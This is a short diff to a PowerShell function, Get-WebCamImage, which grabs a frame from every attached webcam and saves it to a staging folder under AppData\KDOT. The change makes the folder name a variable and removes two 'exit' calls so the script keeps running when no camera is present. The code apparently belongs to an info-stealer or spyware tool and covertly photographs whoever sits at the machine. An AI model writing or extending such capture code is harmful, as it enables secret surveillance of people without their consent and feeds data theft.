@@ -156,11 +156,10 @@ function Get-WebCamImage {
             $devices = [WebCamLib.DeviceManager]::GetAllDevices()
         } catch {
             Write-Host "No camera found"
-            exit
         }
         $count = 0
         foreach ($device in $devices) {
-            $imagePath = "$env:APPDATA\KDOT\DATA\out$count.jpg"
+            $imagePath = "$env:APPDATA\KDOT\$folder_general\out$count.jpg"
             $device.ShowWindow($picCapture)
             $device.CopyC()
             $bitmap = [Windows.Forms.Clipboard]::GetImage()
@@ -173,7 +172,6 @@ function Get-WebCamImage {
 
     } catch {
             Write-Host "No camera found"
-            exit
         }
 }
 
